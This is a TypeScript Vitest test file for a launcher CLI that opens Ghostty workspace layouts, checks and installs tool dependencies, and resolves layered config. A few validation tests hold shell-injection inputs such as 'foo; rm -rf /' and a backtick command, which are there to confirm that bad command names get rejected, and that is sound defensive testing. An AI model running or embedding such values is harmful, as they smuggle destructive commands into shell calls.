import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// Mock child_process before importing launcher
const mockExecSync = vi.fn();
const mockExecFileSync = vi.fn();
vi.mock("node:child_process", () => ({
  execSync: (...args: unknown[]) => mockExecSync(...args),
  execFileSync: (...args: unknown[]) => mockExecFileSync(...args),
}));

// Mock config
const mockReadKVFile = vi.fn((_path: string) => new Map<string, string>());
vi.mock("./config.js", () => ({
  getConfig: vi.fn(),
  listConfig: vi.fn(() => new Map<string, string>()),
  readKVFile: (path: string) => mockReadKVFile(path),
  CONFIG_DIR: "/mock/.config/summon",
}));

// Mock starship
const mockIsStarshipInstalled = vi.fn(() => false);
const mockEnsurePresetConfig = vi.fn(() => "/mock/.config/summon/starship/tokyo-night.toml");
const mockGetPresetConfigPath = vi.fn((name: string) => `/mock/.config/summon/starship/${name}.toml`);
vi.mock("./starship.js", () => ({
  isStarshipInstalled: mockIsStarshipInstalled,
  ensurePresetConfig: mockEnsurePresetConfig,
  getPresetConfigPath: mockGetPresetConfigPath,
  resetStarshipCache: vi.fn(),
}));

// Mock fs.existsSync for directory and Ghostty.app checks
vi.mock("node:fs", () => ({
  existsSync: vi.fn(() => true),
}));

// Mock readline for prompt tests
const mockQuestion = vi.fn();
vi.mock("node:readline", () => ({
  createInterface: () => ({
    question: (_q: string, cb: (a: string) => void) => mockQuestion(_q, cb),
    close: vi.fn(),
  }),
}));

// Mock script generator to isolate launcher logic
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const mockGenerateAppleScript = vi.fn((..._args: any[]) => 'tell application "Ghostty"\nend tell');
vi.mock("./script.js", () => ({
  generateAppleScript: (...args: unknown[]) => mockGenerateAppleScript(...args),
}));

// Import after mocks are set up
const { launch, resolveConfig } = await import("./launcher.js");
const { getConfig, listConfig } = await import("./config.js");
const { existsSync } = await import("node:fs");

beforeEach(() => {
  vi.clearAllMocks();
  // Default: execSync no-ops (osascript, etc.)
  mockExecSync.mockImplementation(() => "");
  // Default: all commands are installed (resolveCommand uses execFileSync)
  mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
    if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
      return "/usr/bin/stub\n";
    return "";
  });
  vi.mocked(existsSync).mockReturnValue(true);
  mockReadKVFile.mockReturnValue(new Map<string, string>());
  vi.mocked(listConfig).mockReturnValue(new Map<string, string>());
  mockGenerateAppleScript.mockReturnValue('tell application "Ghostty"\nend tell');
});

describe("Ghostty detection", () => {
  it("exits with error if directory does not exist", async () => {
    vi.mocked(existsSync).mockReturnValue(false);
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(launch("/nonexistent")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });

  it("exits with error if Ghostty.app is not found at any known path", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      // Ghostty not found anywhere
      if (String(path).endsWith("Ghostty.app")) return false;
      return true;
    });
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining("Ghostty.app not found"),
    );
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("finds Ghostty in ~/Applications (Homebrew)", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      if (String(path) === "/Applications/Ghostty.app") return false;
      return true;
    });

    await launch("/tmp/workspace");
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });

  it("finds Ghostty in /Applications even if ~/Applications is missing", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      if (String(path).endsWith("/Applications/Ghostty.app") && String(path) !== "/Applications/Ghostty.app") return false;
      return true;
    });

    await launch("/tmp/workspace");
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });
});

describe("script execution", () => {
  it("executes generated script via osascript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "osascript",
      [],
      expect.objectContaining({ input: 'tell application "Ghostty"\nend tell' }),
    );
  });

  it("prints script to stdout in dry-run mode without executing", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain('tell application "Ghostty"\nend tell');
    // osascript should NOT have been called
    expect(mockExecFileSync).not.toHaveBeenCalledWith(
      "osascript",
      [],
      expect.anything(),
    );
    logSpy.mockRestore();
  });

  it("passes correct plan and directory to generateAppleScript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace", { layout: "minimal" });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        leftColumnCount: 1,
        rightColumnEditorCount: 0,
        hasShell: false,
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });

  it("passes login shell to generateAppleScript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
    expect(shellArg).toBe(process.env.SHELL ?? "/bin/bash");
  });

  it("falls back to /bin/bash when SHELL env var is undefined", async () => {
    const origShell = process.env.SHELL;
    delete process.env.SHELL;
    vi.mocked(listConfig).mockReturnValue(new Map());

    try {
      await launch("/tmp/workspace");
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/bin/bash");
    } finally {
      process.env.SHELL = origShell;
    }
  });
});

describe("config resolution", () => {
  it("project config overrides global config", () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));
    mockReadKVFile.mockReturnValue(new Map([["editor", "vim"]]));

    const { opts } = resolveConfig("/tmp/workspace", {});
    expect(opts.editor).toBe("vim");
  });

  it("CLI overrides project config", () => {
    mockReadKVFile.mockReturnValue(new Map([["editor", "vim"]]));

    const { opts } = resolveConfig("/tmp/workspace", { editor: "nano" });
    expect(opts.editor).toBe("nano");
  });

  it("preset expansion with individual key overrides", () => {
    mockReadKVFile.mockReturnValue(
      new Map([
        ["layout", "minimal"],
        ["panes", "4"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", {});
    // Preset minimal sets editorPanes=1, but project overrides to 4
    expect(opts.editorPanes).toBe(4);
    // Preset minimal sets shell=false, no override → stays false
    expect(opts.shell).toBe("false");
  });

  it("empty config strings do not override preset values", () => {
    // Bug: machine config with panes= and editor-size= (empty strings)
    // should not override the preset's values
    vi.mocked(listConfig).mockReturnValue(
      new Map([
        ["panes", ""],
        ["editor-size", ""],
        ["editor", ""],
        ["sidebar", ""],
      ]),
    );
    mockReadKVFile.mockReturnValue(new Map());

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const { opts } = resolveConfig("/tmp/workspace", { layout: "cli" });

    // cli preset: editorPanes=1, shell="true"
    // Empty config strings should NOT override these
    expect(opts.editorPanes).toBe(1);
    expect(opts.editorSize).toBeUndefined(); // fall through to planLayout default
    expect(warnSpy).not.toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("empty project config strings do not override preset values", () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockReadKVFile.mockReturnValue(
      new Map([
        ["layout", "full"],
        ["panes", ""],
        ["editor-size", ""],
      ]),
    );

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const { opts } = resolveConfig("/tmp/workspace", {});

    // full preset: editorPanes=3
    expect(opts.editorPanes).toBe(3);
    expect(warnSpy).not.toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("unknown preset warns and falls through to defaults", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    mockReadKVFile.mockReturnValue(new Map([["layout", "bogus"]]));
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", {});
    expect(warnSpy).toHaveBeenCalledWith(
      'Unknown layout preset: "bogus". Valid presets: minimal, full, pair, cli, btop. Using defaults.',
    );
    expect(opts.editorPanes).toBeUndefined();
    warnSpy.mockRestore();
  });

  it("unknown preset warning lists all valid presets", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    mockReadKVFile.mockReturnValue(new Map([["layout", "invalid"]]));
    vi.mocked(listConfig).mockReturnValue(new Map());

    resolveConfig("/tmp/workspace", {});

    const warnMsg = warnSpy.mock.calls[0]![0] as string;
    expect(warnMsg).toContain("minimal");
    expect(warnMsg).toContain("full");
    expect(warnMsg).toContain("pair");
    expect(warnMsg).toContain("cli");
    expect(warnMsg).toContain("btop");
    warnSpy.mockRestore();
  });
});

describe("command dependency checks", () => {
  it("checks editor and sidebar commands before launching", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    // Default editor=claude, sidebar=lazygit
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "claude"], { encoding: "utf-8" },
    );
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "lazygit"], { encoding: "utf-8" },
    );
  });

  it("already-installed commands proceed without prompting", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    expect(mockQuestion).not.toHaveBeenCalled();
  });

  it("offers to install a known missing command (claude)", async () => {
    let claudeCallCount = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") {
        claudeCallCount++;
        if (claudeCallCount <= 1) throw new Error("not found");
        return "/usr/bin/claude\n";
      }
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      // npm install call — let it through
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    await launch("/tmp/workspace");

    expect(mockQuestion).toHaveBeenCalledTimes(1);
    expect(mockQuestion.mock.calls[0]![0]).toContain(
      "npm install -g @anthropic-ai/claude-code",
    );
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "npm",
      ["install", "-g", "@anthropic-ai/claude-code"],
      { stdio: "inherit" },
    );
  });

  it("exits when unknown command is missing", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "obscure-tool") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "obscure-tool"], ["sidebar", "htop"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });

  it("shows correct CLI syntax in error message for editor", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "obscure-tool") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "obscure-tool"], ["sidebar", "htop"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");

    const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
    const configMsg = errorMessages.find((m) => m.includes("summon"));
    expect(configMsg).toBeDefined();
    expect(configMsg).toContain("summon set editor <command>");

    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("shows correct CLI syntax in error message for sidebar", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "unknown-sidebar") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["sidebar", "unknown-sidebar"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");

    const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
    const configMsg = errorMessages.find((m) => m.includes("summon"));
    expect(configMsg).toBeDefined();
    expect(configMsg).toContain("summon set sidebar <command>");

    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("shows correct CLI syntax in error message for shell", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "unknown-shell") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["shell", "unknown-shell run dev"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");

    const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
    const configMsg = errorMessages.find((m) => m.includes("summon"));
    expect(configMsg).toBeDefined();
    expect(configMsg).toContain("summon set shell <command>");

    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("falls through to defaults when editor and sidebar are empty strings in config", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", ""], ["sidebar", ""]]));

    await launch("/tmp/workspace");

    // Empty config values are treated as "unset" — defaults (claude, lazygit) are used
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "claude"], { encoding: "utf-8" },
    );
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "lazygit"], { encoding: "utf-8" },
    );
  });

  it("exits when user declines install", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("n");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });
});

describe("secondaryEditor binary check", () => {
  it("checks secondaryEditor binary when btop preset is used", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace", { layout: "btop" });

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "btop"], { encoding: "utf-8" },
    );
  });
});

describe("ensureCommand error paths", () => {
  it("exits when install command throws an error", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      // npm install call — simulate failure
      throw new Error("install failed");
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      "Failed to install `claude`. Please install it manually and try again.",
    );
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("exits when command still not found after successful install", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      // npm install call — succeed but command still not found
      return Buffer.from("");
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      "`claude` still not found after install. Please check your PATH.",
    );
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("lazygit install handler", () => {
  it("offers to install lazygit via brew when missing and brew is available", async () => {
    let lazygitCallCount = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "lazygit") {
        lazygitCallCount++;
        if (lazygitCallCount <= 1) throw new Error("not found");
        return "/usr/bin/lazygit\n";
      }
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      // brew install call — let it through
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    await launch("/tmp/workspace");

    expect(mockQuestion).toHaveBeenCalledTimes(1);
    expect(mockQuestion.mock.calls[0]![0]).toContain("brew install lazygit");
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "brew",
      ["install", "lazygit"],
      { stdio: "inherit" },
    );
  });

  it("shows no-known-install-method error when lazygit missing and brew unavailable", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "lazygit") throw new Error("not found");
      // brew check (called with stdio: "ignore", no "--" arg)
      if (bin === "/bin/sh" && Array.isArray(args) && args[1] === "command -v brew") throw new Error("not found");
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");

    expect(mockExit).toHaveBeenCalledWith(1);
    const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
    expect(errorMessages).toContainEqual(
      expect.stringContaining("no known install method"),
    );

    mockExit.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("command name validation", () => {
  it("rejects command names with shell injection characters", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "foo; rm -rf /"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining("Invalid command name"),
    );
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("rejects command names with backticks", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "`evil`"]]));

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("accepts valid command names with dots and hyphens", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "my-editor.v2"], ["sidebar", "htop"]]));

    await launch("/tmp/workspace");

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/bin/sh", ["-c", 'command -v "$1"', "--", "my-editor.v2"], { encoding: "utf-8" },
    );
  });
});

describe("input validation", () => {
  it("warns and uses default when panes is NaN", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { panes: "abc" });
    expect(opts.editorPanes).toBe(2);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("warns and uses default when panes is zero", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { panes: "0" });
    expect(opts.editorPanes).toBe(2);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("warns and uses default when panes is negative", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { panes: "-2" });
    expect(opts.editorPanes).toBe(2);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("warns and uses default when editorSize is 0", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "0" });
    expect(opts.editorSize).toBe(75);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("warns and uses default when editorSize is out of range", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "150" });
    expect(opts.editorSize).toBe(75);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("warns and uses default when editorSize is NaN", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "big" });
    expect(opts.editorSize).toBe(75);
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("accepts valid panes value", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { panes: "5" });
    expect(opts.editorPanes).toBe(5);
    expect(warnSpy).not.toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("accepts valid editorSize value", () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map());

    const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "60" });
    expect(opts.editorSize).toBe(60);
    expect(warnSpy).not.toHaveBeenCalled();
    warnSpy.mockRestore();
  });
});

describe("osascript error handling", () => {
  it("includes osascript error detail in the failure message", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw new Error("execution error: Ghostty got an error: connection is invalid (-609)");
      }
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining("connection is invalid (-609)"),
    );
    expect(errorSpy).toHaveBeenCalledWith("Is Ghostty running?");
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });

  it("handles non-Error thrown values gracefully", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw "string error";
      }
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining("string error"),
    );
    mockExit.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("autoResize config resolution", () => {
  it("sets autoResize to false when auto-resize is 'false'", () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockReadKVFile.mockReturnValue(new Map<string, string>());

    const { opts } = resolveConfig("/tmp/workspace", { "auto-resize": "false" });
    expect(opts.autoResize).toBe(false);
  });

  it("sets autoResize to true when auto-resize is 'true'", () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockReadKVFile.mockReturnValue(new Map<string, string>());

    const { opts } = resolveConfig("/tmp/workspace", { "auto-resize": "true" });
    expect(opts.autoResize).toBe(true);
  });
});

describe("falsy sidebarCommand guard", () => {
  it("launches successfully when sidebar is not set (uses default)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["sidebar", ""]]));

    await launch("/tmp/workspace");

    // Empty sidebar falls through to default (lazygit), which gets resolved
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        sidebarCommand: "/usr/bin/stub",
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });

  it("skips sidebar resolution when sidebarCommand is empty in the plan", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    // Override sidebar to empty string via CLI so planLayout produces sidebarCommand=""
    await launch("/tmp/workspace", { sidebar: "" });

    // sidebarCommand is "" (falsy), so ensureAndResolve is never called for sidebar.
    // No resolveCommand call for empty sidebar binary.
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        sidebarCommand: "",
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });
});

describe("config read caching (#31)", () => {
  it("reads machine config once via listConfig instead of per-key getConfig calls", () => {
    vi.mocked(listConfig).mockReturnValue(
      new Map([
        ["editor", "vim"],
        ["sidebar", "htop"],
      ]),
    );
    mockReadKVFile.mockReturnValue(new Map<string, string>());

    resolveConfig("/tmp/workspace", {});

    // listConfig should be called exactly once
    expect(listConfig).toHaveBeenCalledTimes(1);
    // getConfig should NOT be called at all (replaced by listConfig)
    expect(getConfig).not.toHaveBeenCalled();
  });

  it("correctly resolves values from cached config", () => {
    vi.mocked(listConfig).mockReturnValue(
      new Map([
        ["editor", "vim"],
        ["sidebar", "htop"],
        ["panes", "3"],
      ]),
    );
    mockReadKVFile.mockReturnValue(new Map<string, string>());

    const { opts } = resolveConfig("/tmp/workspace", {});

    expect(opts.editor).toBe("vim");
    expect(opts.sidebarCommand).toBe("htop");
    expect(opts.editorPanes).toBe(3);
  });
});

describe("command resolution deduplication (#32)", () => {
  it("calls resolveCommand only once per binary during launch", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") return "/usr/bin/claude\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "lazygit") return "/usr/bin/lazygit\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // Each binary should be resolved exactly once, not twice
    const claudeCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/bin/sh" && Array.isArray(c[1]) && c[1][3] === "claude",
    );
    const lazygitCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/bin/sh" && Array.isArray(c[1]) && c[1][3] === "lazygit",
    );
    expect(claudeCalls).toHaveLength(1);
    expect(lazygitCalls).toHaveLength(1);
  });

  it("uses ensureCommand return value for path resolution instead of re-resolving", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "npm") return "/usr/local/bin/npm\n";
